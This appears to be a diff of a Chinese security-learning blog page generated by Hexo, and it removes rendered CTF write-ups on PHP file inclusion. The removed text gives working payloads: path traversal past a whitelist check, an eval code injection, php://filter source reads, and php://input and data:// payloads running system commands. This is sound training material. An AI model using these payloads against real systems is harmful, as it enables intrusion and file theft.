-        //isset()判断变量是否声明，is_string()判断变量是否是字符串
-        if (! isset($page) || !is_string($page)) &#123;
-            echo &quot;you can&#39;t see it&quot;;
-            return false;
-        &#125;
-
-        //检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真
-        if (in_array($page, $whitelist)) &#123;            
-            return true;
-        &#125;
-
-        //过滤问号的函数(如果$page的值有？则从?之前提取字符串)
-        $_page = mb_substr(
-            $page,
-            0,
-            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
-        );
-
-        //第二次检测传进来的值是否匹配白名单列表$whitelist
-        if (in_array($_page, $whitelist)) &#123;
-            return true;
-        &#125;
-
-        //对$page进行url解码
-        $_page = urldecode($page);
-
-         //第二次过滤问号的函数(如果$page的值有？则从?之前提取字符串)
-        $_page = mb_substr(
-            $_page,
-            0,
-            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
-        );
-
-        //第三次检测传进来的值是否匹配白名单列表$whitelist
-        if (in_array($_page, $whitelist)) &#123;
-            return true;
-        &#125;
-
-        //若以上都没通过，则返回false
-        echo &quot;you can&#39;t see it&quot;;
-        return false;
-    &#125;
-&#125;
-
-//---------------------------------------------------------------
-//这里就到了文件包含，需要传入的参数file不为空且是字符串，经过class emmm的检测，即emmm返回真，则包含file    
-if (! empty($_REQUEST[&#39;file&#39;])
-    &amp;&amp; is_string($_REQUEST[&#39;file&#39;])
-    &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])
-) &#123;
-    include $_REQUEST[&#39;file&#39;];
-    exit;
-&#125; else &#123;
-    echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
-&#125;  
-?&gt;</code></pre>
-<hr>
-<p>观察源码发现hint.php，打开发现<br>flag not here, and flag in ffffllllaaaagggg<br>如果满足相应的条件，include引入文件。只需使emmm::checkFile($_REQUEST[‘file’]返回值为true，利用../跳转目录读取flag即可。<br>payload为：file=source.php?/../ffffllllaaaagggg，经过mb_strpos为source.php?/../ffffllllaaaagggg?,  但是mb_strpos这个函数只返回首次出现的位置，所以还是会返回第一个？的位置，而mb_substr截取函数，从0开始截取一直到第一个？的位置，截取内容为source.php，恰好能与白名单中的进行匹配，可以return true;，所以通过第一次截取进行绕过<br>ffffllllaaaagggg文件和index.php不在同一个目录下，所以读取的是上级目录。构造payload <a target="_blank" rel="noopener" href="http://web5.buuctf.cn/?file=source.php?../../../../../ffffllllaaaagggg%EF%BC%8C%E6%89%BE%E5%88%B0flag%EF%BC%88%E5%88%A9%E7%94%A8/%E4%BD%BFsource.php?%E6%88%90%E4%B8%BA%E4%B8%80%E4%B8%AA%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E7%9B%AE%E5%BD%95%EF%BC%8C%E6%9C%80%E5%90%8Einclude%E5%88%A9%E7%94%A8../%E8%B7%B3%E8%BD%AC%E7%9B%AE%E5%BD%95%E8%AF%BB%E5%8F%96flag%E5%8D%B3%E5%8F%AF%EF%BC%89">http://web5.buuctf.cn/?file=source.php?../../../../../ffffllllaaaagggg，找到flag（利用/使source.php?成为一个不存在的目录，最后include利用../跳转目录读取flag即可）</a>  </p>
-<ul>
-<li>注意：../ 有多少个不一定，因为不知道flag在底几层目录里，需要从没有开始一次加一个去尝试。</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="六公子买单">
-      <meta itemprop="description" content="一头努力的菜鸟">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Daq1ang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/01/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="post-title-link" itemprop="url">文件包含</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2021-01-16 10:15:37" itemprop="dateCreated datePublished" datetime="2021-01-16T10:15:37+08:00">2021-01-16</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-01-18 18:09:19" itemprop="dateModified" datetime="2021-01-18T18:09:19+08:00">2021-01-18</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>刚起步，遇到两个 文件包含 的题目<br>先附上CSDN看到的关于文件包含的讲解<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37133717/article/details/94631028">https://blog.csdn.net/qq_37133717/article/details/94631028</a>    </p>
-<h2 id="bugku-6-文件包含-本地包含"><a href="#bugku-6-文件包含-本地包含" class="headerlink" title="bugku-6.文件包含-本地包含"></a>bugku-6.文件包含-本地包含</h2><p>CSDN大佬讲解：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39431542/article/details/88628225">本地文件包含漏洞详解</a><br>第二行可知，flag在flag.php里，倒数第二行show_source(<strong>FILE</strong>)很明显的提示<br>$_REQUEST[]支持get、post两种方式发送过来的请求，很明显接收了hello参数的值，<br>var_dump()函数 显示关于一个或多个表达式的结构信息，包括表达式的类型与值；数组将递归展开值，通过缩进显示其结构<br>eval()函数把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。<br>show_source() 函数对文件进行语法显示,是 highlight_file() 的别名</p>
-<blockquote>
-<p>本题代码如下<br><img src="images/bugku6.1.png" alt="6.1">   </p>
-<ul>
-<li>可直接将flag.php文件读入变量hello中<br>url输入?hello=file(‘flag.php’)<br><img src="images/bugku6.2.png" alt="6.2">     </li>
-<li>eval存在命令执行漏洞，使用hello构造payload<br><code>index.php?hello=1);show_source(%27flag.php%27);var_dump(3</code><br><img src="images/bugku6.3.png" alt="6.3">    </li>
-</ul>
-</blockquote>
-<hr>
-<h2 id="bugku-12-文件包含漏洞"><a href="#bugku-12-文件包含漏洞" class="headerlink" title="bugku-12.文件包含漏洞"></a>bugku-12.文件包含漏洞</h2><blockquote>
-<p><img src="images/bugku12.0.png" alt="12.0"><br>点<br><img src="images/bugku12.1.png" alt="12.1"><br>观察url : “<a target="_blank" rel="noopener" href="http://114.67.246.176:16465/index.php?file=show.php&quot;%EF%BC%8C%E7%9C%8B%E5%88%B0file%EF%BC%8C%E6%98%8E%E7%99%BD%E8%BF%99%E5%8F%88%E6%98%AF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E9%A2%98%E7%9B%AE%EF%BC%8C%E8%81%94%E6%83%B3%E5%88%B0">http://114.67.246.176:16465/index.php?file=show.php&quot;，看到file，明白这又是文件包含的题目，联想到</a><u>读取index文件，但是直接读取index无法查看，所以就应该考虑用base64方法读取，构造url</u>.<br>构造url=“<a target="_blank" rel="noopener" href="http://your/">http://your</a> test ip/index.php?file=php://filter/read=convert.base64-encode/resource=index.php” , 网页返回base64.解码得flag<br><img src="images/bugku12.2.png" alt="12.2"> </p>
-<ul>
-<li>php://是一种协议名称，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是base64编码后，resource=index.php表示目标文件为index.php。  </li>
-</ul>
-</blockquote>
-<hr>
-<h2 id="攻防世界-Web-php-include"><a href="#攻防世界-Web-php-include" class="headerlink" title="攻防世界-Web_php_include"></a>攻防世界-Web_php_include</h2><p><img src="images/gf3.0.png" alt="3.0"><br>从代码中得知page中带有php://的都会被替换成空<br>    str_replace()以其他字符替换字符串中的一些字符(区分大小写)<br>    strstr() 查找字符串首次出现的位置。返回字符串剩余部分    </p>
-<blockquote>
-<p>方法一<br>1.可以利用PHP的大小写转换，利用PHP://input         </p>
-</blockquote>
-<ul>
-<li>php://filter<br>#执行文件<br>page=Php://filter/resource=index.php<br>#读取文件需要将文件名base64编码   page=Php://filter/read=convert.base64-encode/resource=index.php</li>
-<li>php://input<br>这个协议的利用方法是 将要执行的php代码写在post中提交，不用键与值的形式，只写代码即可。 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;ls&quot;);?&gt;      </span><br><span class="line">&lt;?php system(&quot;cat fl4gisisish3r3.php&quot;);?&gt;   </span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>用burpsuite在报文中加一句话木马<br><img src="images/gf3.1.png" alt="3.1"><br><img src="images/gf3.2.png" alt="3.2">    </p>
-</blockquote>
-</li>
-</ul>
-<hr>
-<blockquote>
-<p>方法二 data协议    </p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data: text&#x2F;plain,&lt;?php 执行内容 ?&gt;   </span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;ls&quot;);?&gt;      </span><br><span class="line">?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;cat fl4gisisish3r3.php&quot;);?&gt;  </span><br></pre></td></tr></table></figure>
-<p> 查看源代码，发现flag     </p>
-<blockquote>
-<p>方法三 http://协议进行绕过<br>利用hello参数将执行内容显示，flag如图所示</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php&#x2F;?hello&#x3D;&lt;? system(&quot;ls&quot;);?&gt;      </span><br></pre></td></tr></table></figure>
-<p><img src="images/gf3.3.png" alt="3.3">   </p>
-<pre><code>?page=http://127.0.0.1/index.php/?hello=&lt;? show_source(&quot;fl4gisisish3r3.php&quot;);?&gt;    </code></pre>
-<p><img src="images/gf3.4.png" alt="3.4"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1260,7 +1163,7 @@ if (! empty($_REQUEST[&#39;file&#39;])
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-count">18</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1269,7 +1172,7 @@ if (! empty($_REQUEST[&#39;file&#39;])
         <span class="site-state-item-name">categories</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">tags</span>
       </div>
   </nav>
